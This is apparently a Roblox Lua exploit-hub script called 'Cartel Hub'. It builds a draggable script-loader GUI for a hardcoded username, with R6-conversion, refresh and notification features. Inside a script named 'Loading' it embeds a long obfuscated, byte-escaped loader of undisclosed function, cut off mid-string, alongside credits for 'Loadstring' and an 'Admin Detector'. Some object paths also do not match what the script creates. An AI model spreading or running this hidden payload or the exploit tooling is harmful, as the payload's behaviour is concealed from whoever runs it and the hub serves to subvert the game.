username = "MdsMdle"
print(username)
--[[

CARTEL HUB

Credits:
    GUI - irisk
    Notification System - irisk
    Admin Detector - irisk
    Auto Convert + Loadstring - adiont
    Inspiration from SSP's packages



]]--
local ASJKDLKJHLKJDSF = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")
local LoadingInstances = Instance.new("Folder")
local Loading = Instance.new("TextLabel")
local Creds = Instance.new("TextLabel")
local Main = Instance.new("Folder")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local TextBox = Instance.new("TextBox")
local UICorner_2 = Instance.new("UICorner")
local shadowHolder = Instance.new("Frame")
local umbraShadow = Instance.new("ImageLabel")
local penumbraShadow = Instance.new("ImageLabel")
local ambientShadow = Instance.new("ImageLabel")
local R6B = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local shadowHolder_2 = Instance.new("Frame")
local umbraShadow_2 = Instance.new("ImageLabel")
local penumbraShadow_2 = Instance.new("ImageLabel")
local ambientShadow_2 = Instance.new("ImageLabel")
local RE = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local shadowHolder_3 = Instance.new("Frame")
local umbraShadow_3 = Instance.new("ImageLabel")
local penumbraShadow_3 = Instance.new("ImageLabel")
local ambientShadow_3 = Instance.new("ImageLabel")
local UIGradient = Instance.new("UIGradient")
local sync = Instance.new("ImageButton")
local Template = Instance.new("TextButton")
local Notification = Instance.new("Frame")
local UIGradient_2 = Instance.new("UIGradient")
local UICorner_5 = Instance.new("UICorner")
local Title_2 = Instance.new("TextLabel")
local Message = Instance.new("TextLabel")
local Overlay = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local Overlay_2 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local Notifications = Instance.new("Folder")

--Properties:

ASJKDLKJHLKJDSF.Name = "ASJKDLKJHLKJDSF"
ASJKDLKJHLKJDSF.Parent = game.Players:FindFirstChild(username).PlayerGui
ASJKDLKJHLKJDSF.ResetOnSpawn = false

Frame.Parent = ASJKDLKJHLKJDSF
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.395999998, 0, 0.406947881, 0)
Frame.Size = UDim2.new(0, 259, 0, 149)

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Size = UDim2.new(0, 118, 0, 34)
Title.ZIndex = 11
Title.Font = Enum.Font.Unknown
Title.Text = "Cartel Hub"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 22.000

UICorner.Parent = Frame

LoadingInstances.Name = "LoadingInstances"
LoadingInstances.Parent = Frame

Loading.Name = "Loading"
Loading.Parent = LoadingInstances
Loading.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Loading.BackgroundTransparency = 1.000
Loading.BorderColor3 = Color3.fromRGB(0, 0, 0)
Loading.BorderSizePixel = 0
Loading.Position = UDim2.new(0.115830116, 0, 0.335570484, 0)
Loading.Size = UDim2.new(0, 200, 0, 50)
Loading.Visible = false
Loading.ZIndex = 12
Loading.Font = Enum.Font.Unknown
Loading.Text = "Loading scripts..."
Loading.TextColor3 = Color3.fromRGB(255, 255, 255)
Loading.TextSize = 22.000

Creds.Name = "Creds"
Creds.Parent = LoadingInstances
Creds.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Creds.BackgroundTransparency = 1.000
Creds.BorderColor3 = Color3.fromRGB(0, 0, 0)
Creds.BorderSizePixel = 0
Creds.Position = UDim2.new(0.111969113, 0, 0.724832237, 0)
Creds.Size = UDim2.new(0, 200, 0, 32)
Creds.Visible = false
Creds.ZIndex = 12
Creds.Font = Enum.Font.Unknown
Creds.Text = "Made by irisk_"
Creds.TextColor3 = Color3.fromRGB(255, 255, 255)
Creds.TextSize = 15.000

Main.Name = "Main"
Main.Parent = Frame

ScrollingFrame.Parent = Main
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.019693654, 0, 0.1328125, 0)
ScrollingFrame.Size = UDim2.new(0, 438, 0, 179)
ScrollingFrame.Visible = false
ScrollingFrame.ZIndex = 11
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

UIListLayout.Parent = ScrollingFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 0.650
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.0284463894, 0, 0.85546875, 0)
TextBox.Size = UDim2.new(0, 335, 0, 27)
TextBox.Visible = false
TextBox.ZIndex = 3
TextBox.Font = Enum.Font.Unknown
TextBox.PlaceholderColor3 = Color3.fromRGB(113, 113, 113)
TextBox.PlaceholderText = "Search"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 14.000

UICorner_2.Parent = TextBox

shadowHolder.Name = "shadowHolder"
shadowHolder.Parent = TextBox
shadowHolder.BackgroundTransparency = 1.000
shadowHolder.Size = UDim2.new(1, 0, 1, 0)

umbraShadow.Name = "umbraShadow"
umbraShadow.Parent = shadowHolder
umbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
umbraShadow.BackgroundTransparency = 1.000
umbraShadow.Position = UDim2.new(0.5, 0, 0.5, 6)
umbraShadow.Size = UDim2.new(1, 10, 1, 10)
umbraShadow.Image = "rbxassetid://1316045217"
umbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
umbraShadow.ImageTransparency = 0.860
umbraShadow.ScaleType = Enum.ScaleType.Slice
umbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)
umbraShadow.SliceScale = 2.000

penumbraShadow.Name = "penumbraShadow"
penumbraShadow.Parent = shadowHolder
penumbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
penumbraShadow.BackgroundTransparency = 1.000
penumbraShadow.Position = UDim2.new(0.5, 0, 0.5, 6)
penumbraShadow.Size = UDim2.new(1, 10, 1, 10)
penumbraShadow.Image = "rbxassetid://1316045217"
penumbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
penumbraShadow.ImageTransparency = 0.880
penumbraShadow.ScaleType = Enum.ScaleType.Slice
penumbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)
penumbraShadow.SliceScale = 2.000

ambientShadow.Name = "ambientShadow"
ambientShadow.Parent = shadowHolder
ambientShadow.AnchorPoint = Vector2.new(0.5, 0.5)
ambientShadow.BackgroundTransparency = 1.000
ambientShadow.Position = UDim2.new(0.5, 0, 0.5, 6)
ambientShadow.Size = UDim2.new(1, 10, 1, 10)
ambientShadow.Image = "rbxassetid://1316045217"
ambientShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
ambientShadow.ImageTransparency = 0.880
ambientShadow.ScaleType = Enum.ScaleType.Slice
ambientShadow.SliceCenter = Rect.new(10, 10, 118, 118)
ambientShadow.SliceScale = 2.000

R6B.Name = "R6B"
R6B.Parent = Main
R6B.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
R6B.BackgroundTransparency = 0.650
R6B.BorderColor3 = Color3.fromRGB(0, 0, 0)
R6B.BorderSizePixel = 0
R6B.Position = UDim2.new(0.776805103, 0, 0.85546875, 0)
R6B.Size = UDim2.new(0, 32, 0, 27)
R6B.Visible = false
R6B.ZIndex = 11
R6B.Font = Enum.Font.Unknown
R6B.Text = "R6"
R6B.TextColor3 = Color3.fromRGB(80, 80, 80)
R6B.TextSize = 14.000

UICorner_3.Parent = R6B

shadowHolder_2.Name = "shadowHolder"
shadowHolder_2.Parent = R6B
shadowHolder_2.BackgroundTransparency = 1.000
shadowHolder_2.Size = UDim2.new(1, 0, 1, 0)
shadowHolder_2.ZIndex = 10

umbraShadow_2.Name = "umbraShadow"
umbraShadow_2.Parent = shadowHolder_2
umbraShadow_2.AnchorPoint = Vector2.new(0.5, 0.5)
umbraShadow_2.BackgroundTransparency = 1.000
umbraShadow_2.Position = UDim2.new(0.5, 0, 0.5, 6)
umbraShadow_2.Size = UDim2.new(1, 10, 1, 10)
umbraShadow_2.ZIndex = 10
umbraShadow_2.Image = "rbxassetid://1316045217"
umbraShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
umbraShadow_2.ImageTransparency = 0.860
umbraShadow_2.ScaleType = Enum.ScaleType.Slice
umbraShadow_2.SliceCenter = Rect.new(10, 10, 118, 118)

penumbraShadow_2.Name = "penumbraShadow"
penumbraShadow_2.Parent = shadowHolder_2
penumbraShadow_2.AnchorPoint = Vector2.new(0.5, 0.5)
penumbraShadow_2.BackgroundTransparency = 1.000
penumbraShadow_2.Position = UDim2.new(0.5, 0, 0.5, 6)
penumbraShadow_2.Size = UDim2.new(1, 10, 1, 10)
penumbraShadow_2.ZIndex = 10
penumbraShadow_2.Image = "rbxassetid://1316045217"
penumbraShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
penumbraShadow_2.ImageTransparency = 0.880
penumbraShadow_2.ScaleType = Enum.ScaleType.Slice
penumbraShadow_2.SliceCenter = Rect.new(10, 10, 118, 118)

ambientShadow_2.Name = "ambientShadow"
ambientShadow_2.Parent = shadowHolder_2
ambientShadow_2.AnchorPoint = Vector2.new(0.5, 0.5)
ambientShadow_2.BackgroundTransparency = 1.000
ambientShadow_2.Position = UDim2.new(0.5, 0, 0.5, 6)
ambientShadow_2.Size = UDim2.new(1, 10, 1, 10)
ambientShadow_2.ZIndex = 10
ambientShadow_2.Image = "rbxassetid://1316045217"
ambientShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
ambientShadow_2.ImageTransparency = 0.880
ambientShadow_2.ScaleType = Enum.ScaleType.Slice
ambientShadow_2.SliceCenter = Rect.new(10, 10, 118, 118)

RE.Name = "RE"
RE.Parent = Main
RE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RE.BackgroundTransparency = 0.650
RE.BorderColor3 = Color3.fromRGB(0, 0, 0)
RE.BorderSizePixel = 0
RE.Position = UDim2.new(0.870896995, 0, 0.85546875, 0)
RE.Size = UDim2.new(0, 32, 0, 27)
RE.Visible = false
RE.ZIndex = 11
RE.Font = Enum.Font.Unknown
RE.Text = "RE"
RE.TextColor3 = Color3.fromRGB(80, 80, 80)
RE.TextSize = 14.000

UICorner_4.Parent = RE

shadowHolder_3.Name = "shadowHolder"
shadowHolder_3.Parent = RE
shadowHolder_3.BackgroundTransparency = 1.000
shadowHolder_3.Size = UDim2.new(1, 0, 1, 0)
shadowHolder_3.ZIndex = 10

umbraShadow_3.Name = "umbraShadow"
umbraShadow_3.Parent = shadowHolder_3
umbraShadow_3.AnchorPoint = Vector2.new(0.5, 0.5)
umbraShadow_3.BackgroundTransparency = 1.000
umbraShadow_3.Position = UDim2.new(0.5, 0, 0.5, 6)
umbraShadow_3.Size = UDim2.new(1, 10, 1, 10)
umbraShadow_3.ZIndex = 10
umbraShadow_3.Image = "rbxassetid://1316045217"
umbraShadow_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
umbraShadow_3.ImageTransparency = 0.860
umbraShadow_3.ScaleType = Enum.ScaleType.Slice
umbraShadow_3.SliceCenter = Rect.new(10, 10, 118, 118)

penumbraShadow_3.Name = "penumbraShadow"
penumbraShadow_3.Parent = shadowHolder_3
penumbraShadow_3.AnchorPoint = Vector2.new(0.5, 0.5)
penumbraShadow_3.BackgroundTransparency = 1.000
penumbraShadow_3.Position = UDim2.new(0.5, 0, 0.5, 6)
penumbraShadow_3.Size = UDim2.new(1, 10, 1, 10)
penumbraShadow_3.ZIndex = 10
penumbraShadow_3.Image = "rbxassetid://1316045217"
penumbraShadow_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
penumbraShadow_3.ImageTransparency = 0.880
penumbraShadow_3.ScaleType = Enum.ScaleType.Slice
penumbraShadow_3.SliceCenter = Rect.new(10, 10, 118, 118)

ambientShadow_3.Name = "ambientShadow"
ambientShadow_3.Parent = shadowHolder_3
ambientShadow_3.AnchorPoint = Vector2.new(0.5, 0.5)
ambientShadow_3.BackgroundTransparency = 1.000
ambientShadow_3.Position = UDim2.new(0.5, 0, 0.5, 6)
ambientShadow_3.Size = UDim2.new(1, 10, 1, 10)
ambientShadow_3.ZIndex = 10
ambientShadow_3.Image = "rbxassetid://1316045217"
ambientShadow_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
ambientShadow_3.ImageTransparency = 0.880
ambientShadow_3.ScaleType = Enum.ScaleType.Slice
ambientShadow_3.SliceCenter = Rect.new(10, 10, 118, 118)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(34, 255, 0)), ColorSequenceKeypoint.new(0.32, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.71, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0))}
UIGradient.Parent = Frame

sync.Name = "sync"
sync.Parent = Frame
sync.BackgroundTransparency = 1.000
sync.LayoutOrder = 5
sync.Position = UDim2.new(0.944613755, 0, 0.0173478127, 0)
sync.Size = UDim2.new(0, 25, 0, 25)
sync.Visible = false
sync.ZIndex = 2
sync.Image = "rbxassetid://3926305904"
sync.ImageRectOffset = Vector2.new(884, 244)
sync.ImageRectSize = Vector2.new(36, 36)

Template.Name = "Template"
Template.Parent = game.Workspace.ASJKDLKJHLKJDSF.Frame.LoadScripts
Template.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Template.BackgroundTransparency = 0.950
Template.BorderColor3 = Color3.fromRGB(0, 0, 0)
Template.BorderSizePixel = 0
Template.Size = UDim2.new(0, 429, 0, 35)
Template.ZIndex = 12
Template.Font = Enum.Font.Unknown
Template.Text = "Script.txt"
Template.TextColor3 = Color3.fromRGB(255, 255, 255)
Template.TextSize = 16.000

Notification.Name = "Notification"
Notification.Parent = game.Workspace.ASJKDLKJHLKJDSF.Frame.Notif
Notification.AnchorPoint = Vector2.new(1, 1)
Notification.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Notification.BorderColor3 = Color3.fromRGB(0, 0, 0)
Notification.BorderSizePixel = 0
Notification.Position = UDim2.new(1.99000001, -10, 0.999000013, -10)
Notification.Size = UDim2.new(0, 238, 0, 109)
Notification.ZIndex = 10

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(34, 255, 0)), ColorSequenceKeypoint.new(0.32, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.71, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0))}
UIGradient_2.Parent = Notification

UICorner_5.Parent = Notification

Title_2.Name = "Title"
Title_2.Parent = Notification
Title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_2.BackgroundTransparency = 1.000
Title_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BorderSizePixel = 0
Title_2.Position = UDim2.new(0.268907577, 0, 0.0366972461, 0)
Title_2.Size = UDim2.new(0, 77, 0, 23)
Title_2.ZIndex = 12
Title_2.Font = Enum.Font.Unknown
Title_2.Text = "Cartel Hub"
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextSize = 23.000
Title_2.TextXAlignment = Enum.TextXAlignment.Left

Message.Name = "Message"
Message.Parent = Notification
Message.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Message.BackgroundTransparency = 1.000
Message.BorderColor3 = Color3.fromRGB(0, 0, 0)
Message.BorderSizePixel = 0
Message.Position = UDim2.new(0.0336134471, 0, 0.247706428, 0)
Message.Size = UDim2.new(0, 224, 0, 71)
Message.ZIndex = 12
Message.Font = Enum.Font.Gotham
Message.Text = ""
Message.TextColor3 = Color3.fromRGB(255, 255, 255)
Message.TextSize = 14.000
Message.TextWrapped = true

Overlay.Name = "Overlay"
Overlay.Parent = Notification
Overlay.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Overlay.BackgroundTransparency = 0.550
Overlay.BorderColor3 = Color3.fromRGB(0, 0, 0)
Overlay.BorderSizePixel = 0
Overlay.Size = UDim2.new(0, 238, 0, 109)
Overlay.ZIndex = 11

UICorner_6.Parent = Overlay

Overlay_2.Name = "Overlay"
Overlay_2.Parent = Frame
Overlay_2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Overlay_2.BackgroundTransparency = 0.550
Overlay_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Overlay_2.BorderSizePixel = 0
Overlay_2.Size = UDim2.new(0, 259, 0, 149)

UICorner_7.Parent = Overlay_2

Notifications.Name = "Notifications"
Notifications.Parent = ASJKDLKJHLKJDSF

-- Module Scripts:

local fake_module_scripts = {}

do -- Main.R6
	local script = Instance.new('ModuleScript', Main)
	script.Name = "R6"
	local function module_script()
		local R6Converter = {}
		function R6Converter.load(Plr)
		Plr = game.Players:WaitForChild(Plr)
		local FalseChar = script:WaitForChild(" "):Clone()
		local PlayersCharacter = game.Players:GetCharacterAppearanceAsync(Plr.UserId):Clone()
		local FaceID = (Plr.Character:WaitForChild("Head"):FindFirstChild("face") or {Texture = "http://www.roblox.com/asset/?id=144080495"}).Texture
		local Accessories = {}
		FalseChar:WaitForChild("Head"):WaitForChild("face").Texture = FaceID
		FalseChar:SetPrimaryPartCFrame(Plr.Character:WaitForChild("HumanoidRootPart").CFrame)
		for _,Prt in pairs(PlayersCharacter:GetDescendants()) do
		if Prt:IsA("Accessory") or Prt:IsA("Hat") or Prt:IsA("BodyColors") or Prt:IsA("CharacterMesh")or Prt:IsA("Pants") or Prt:IsA("Shirt") or Prt:IsA("ShirtGraphic") or Prt:IsA("Tool") then
		table.insert(Accessories,Prt:Clone())
		end
		end
		
		for _,Prt in pairs(Plr.Character:GetChildren()) do
		Prt:Destroy()
		end
		for _,Prt in pairs(FalseChar:GetChildren()) do
		Prt.Parent = Plr.Character
		end
		for _,Prt in pairs(Accessories) do
		Prt.Parent = Plr.Character
		end
		
		
		end
		
		return R6Converter
		
	end
	fake_module_scripts[script] = module_script
end
do -- Frame.Notif
	local script = Instance.new('ModuleScript', Frame)
	script.Name = "Notif"
	local function module_script()
		local screenGui = script.Parent.Parent
		
		local NotificationObject = {}
		NotificationObject.__index = NotificationObject
		
		
		function NotificationObject.new()
		    local newNotifObj = setmetatable({}, NotificationObject)
		    return newNotifObj
		end
		
		
		function NotificationObject:PushNotification(msg)
		
		    for _,oldNotif in pairs(screenGui:FindFirstChild("Notifications"):GetChildren()) do
		        oldNotif:TweenPosition(oldNotif.Position - UDim2.new(0,0,0, oldNotif.Size.Y.Offset + 10),Enum.EasingDirection.Out,Enum.EasingStyle.Quint,1)
		    end
		    local Notification = script.Notification:Clone()
		    Notification.Parent = script.Parent.Parent.Notifications
		    Notification.Message.Text = msg
		    Notification:TweenPosition(UDim2.new(1, -10,1, -10),Enum.EasingDirection.Out,Enum.EasingStyle.Quint,1)
		    wait(10)
		    Notification:TweenPosition(Notification.Position - UDim2.new(-0.5025125628140704,-10,0,0),Enum.EasingDirection.In,Enum.EasingStyle.Quint,1)
		    wait(1)
		    Notification:Destroy()
		end
		
		return NotificationObject
	end
	fake_module_scripts[script] = module_script
end


-- Scripts:

local function VKQZ_fake_script() -- Frame.Smooth GUI Dragging 
	local script = Instance.new('LocalScript', Frame)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
coroutine.wrap(VKQZ_fake_script)()
local function UFKIO_fake_script() -- Main.Search 
	local script = Instance.new('LocalScript', Main)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local searchbar = script.Parent.TextBox
	local ScrollFrame = script.Parent.ScrollingFrame
	
	function updateSearch()
	    while wait(0) do
	        for i,button in pairs(ScrollFrame:GetChildren()) do
	            if button:IsA("TextButton") then
	                local searchtext = string.lower(searchbar.Text)
	                if searchtext ~= "" then
	                    local buttonText = string.lower(button.Text)
	                    if string.find(buttonText, searchtext) then
	                        button.Visible = true
	                        ScrollFrame.CanvasPosition = Vector2.new(0, 0)
	                    else
	                        button.Visible = false
	                    end
	                else
	                    button.Visible = true
	                end
	            end
	        end
	    end
	end
	
	spawn(updateSearch)
end
coroutine.wrap(UFKIO_fake_script)()
local function VDUVWO_fake_script() -- Main.Script 
	local script = Instance.new('Script', Main)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local Refresh = script.Parent.RE
	local R6 = script.Parent.R6B
	R6.MouseButton1Click:Connect(function()
	    require(script.Parent.R6).load(script.Parent.Parent.Parent.Parent.Parent.Name)
	end)
	Refresh.MouseButton1Click:Connect(function()
	    game.Players:FindFirstChild(script.Parent.Parent.Parent.Parent.Parent.Name):LoadCharacter()
	end)
end
coroutine.wrap(VDUVWO_fake_script)()
local function LQSNYW_fake_script() -- sync.Script 
	local script = Instance.new('Script', sync)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
	    local Sync = script.Parent
	    local TS = game:GetService("TweenService")
	    local TweenINfo = TweenInfo.new(2,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut)
	    local anim = TS:Create(Sync,TweenINfo,{Rotation = 360})
	    anim:Play()
	    Sync.Rotation = 0
	    script.Parent.Parent.LoadScripts.Disabled = false
	    wait(2)
	    script.Parent.Parent.LoadScripts.Disabled = true
	end)
end
coroutine.wrap(LQSNYW_fake_script)()
local function XBMZ_fake_script() -- sync.LocalScript 
	local script = Instance.new('LocalScript', sync)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local NotificationModule = require(script.Parent.Parent.Notif)
	script.Parent.MouseButton1Click:Connect(function()
	    wait(3)
	    local scripts = script.Parent.Parent.Main.ScrollingFrame
	    local amount = 0
	    for i,v in pairs(scripts:GetChildren()) do
	        if v:IsA("TextButton") then
	            amount = amount + 1
	        end
	    end
	    wait(2)
	    NotificationModule:PushNotification("Successfully reloaded ".. tostring(amount) .." scripts!")
	end)
end
coroutine.wrap(XBMZ_fake_script)()
-- Frame.LoadScripts is disabled.
-- Template.LocalScript is disabled.
local function PHBLYKR_fake_script() -- nil.LocalScript 
	local script = Instance.new('LocalScript', nil)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local Notification = require(script.Parent.Parent.Notif)
	local RemoteEvent = script.Parent.RemoteEvent
	RemoteEvent.OnClientEvent:Connect(function(Message)
	    Notification:PushNotification(Message)
	end)
end
coroutine.wrap(PHBLYKR_fake_script)()
local function KAHI_fake_script() -- Frame.Loading 
	local script = Instance.new('Script', Frame)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	return(function(...)local c={"\102\077\057\069\102\070\050\116\113\076\097\061","\075\111\047\071\082\114\099\061";"\089\080\099\082\088\050\080\080\090\115\106\071\107\122\043\089";"\088\089\106\083\048\066\072\061";"\111\081\047\122\106\074\047\070\051\115\071\051\088\081\083\068\050\087\061\061","\086\121\088\115\048\050\088\115\065\122\106\100\065\118\054\081","\043\121\077\083\043\053\061\061";"\043\089\083\067\118\051\061\061";"\106\121\088\115\051\121\100\083\048\068\106\056\104\050\082\061","\117\068\054\078\055\070\102\083\089\085\119\100\068\074\097\061","\109\048\055\047\054\072\121\121","\122\080\098\052\104\122\106\100\043\068\077\119\048\068\089\061";"\068\112\119\101\085\087\061\061";"\086\079\077\067\068\097\061\061";"\043\057\102\067\099\102\087\113";"\086\122\111\116\086\075\047\083\084\116\043\085\079\121\054\107\111\087\061\061","\079\070\051\071\051\080\043\083\051\075\104\109\050\118\081\109","\089\109\099\087\089\051\065\073\072\053\061\061","\111\121\111\057\104\122\104\082\111\088\081\099\104\081\072\061";"\055\065\081\074\115\053\085\076\085\053\061\061";"\065\078\081\115\104\051\061\061";"\112\089\102\072\074\116\117\053\048\085\098\077\086\119\051\065\057\098\099\050\081\084\081\084\116\097\061\061";"\043\068\077\119\048\068\089\061","\085\104\073\072\049\055\079\111\049\097\061\061","\065\121\100\100\086\087\061\061";"\114\105\073\105\088\068\105\072\103\052\082\061";"\102\087\107\122\043\111\106\088\081\069\085\053\104\085\076\043\065\111\119\069\080\053\061\061","\075\079\117\084\051\099\053\119\057\116\048\106\111\104\090\061";"\102\054\119\115\043\056\047\078","\048\099\071\079\086\122\083\111\086\075\102\051\090\081\053\121";"\084\068\043\097\107\118\104\066\120\088\081\051\086\121\100\070","\122\080\098\083\048\118\106\081\084\053\061\061","\043\068\098\075\043\070\047\083\048\118\086\061";"\090\110\073\099","\109\080\055\073\085\053\061\061";"\106\121\088\115\089\118\077\049\079\115\081\049\106\113\047\105\043\122\053\061";"\087\105\116\089\067\122\051\061","\098\066\047\081\100\105\050\076\076\051\061\061";"\087\077\075\114";"\049\048\112\077\056\088\087\061","\043\073\111\074\065\113\088\069\090\089\106\097\051\078\102\068";"\086\118\077\049\104\068\098\052";"\086\121\111\056\079\122\102\115","\043\048\110\119\054\051\043\089\073\085\104\105";"\105\086\109\047\086\103\099\109";"\069\071\113\088\057\117\076\086";"\117\067\052\075";"\086\099\104\054\107\066\106\050\089\118\106\109\089\113\106\099\048\051\061\061","\122\080\098\078\065\097\061\061";"\108\117\101\075\079\071\072\061","\048\050\106\088\111\066\047\051\088\074\098\075\107\050\077\104\086\121\087\061";"\048\073\099\061","\085\118\101\090\078\085\097\110\090\089\065\108\052\087\055\050\079\069\117\112","\106\068\088\075\043\070\047\105\084\051\061\061";"\086\068\077\083\086\078\090\061","\121\085\097\117\047\051\061\061","\100\084\049\066\055\051\061\061","\099\071\056\112\049\048\070\117";"\049\070\105\075\085\081\106\114\103\087\061\061";"\120\084\100\065\116\107\116\090\103\082\101\090\107\065\053\076\116\099\102\090";"\104\113\111\080\065\087\061\061","\088\070\043\081\104\050\071\066\079\122\083\081","\083\051\107\073\121\085\072\072","\103\083\051\112";"\111\090\115\120\075\112\075\082\120\100\110\043\115\079\074\061","\048\050\077\115\079\053\061\061";"","\043\068\098\049\043\050\080\119\104\122\072\061";"\098\080\083\083\084\067\104\055\086\087\061\061","\121\098\099\084\115\116\070\118";"\099\079\119\054\070\082\086\057","\079\109\043\084\088\097\061\061","\088\068\077\052\086\068\088\056\072\099\106\081\043\068\088\116\043\068\088\074\072\051\061\061","\065\074\104\065\107\122\106\112\066\089\047\056\088\115\081\103\106\053\061\061";"\104\070\087\082\065\080\065\097\079\115\052\113\048\118\083\055\084\073\089\061","\054\112\110\098\108\101\051\061";"\075\107\078\112\116\083\073\089\065\122\112\050\057\102\076\061";"\113\051\115\114\112\081\076\110","\089\085\099\076\051\055\104\106\120\081\073\122\083\081\070\057\110\056\075\120\103\101\077\105","\088\070\053\071\065\078\088\118\089\116\106\051\090\050\104\104\088\087\061\061","\119\073\056\048\107\051\061\061";"\077\107\084\097\057\122\112\072\101\054\106\112\086\118\082\089\082\057\053\061","\079\076\111\043\110\071\072\043\070\056\072\054\085\100\080\108\109\111\08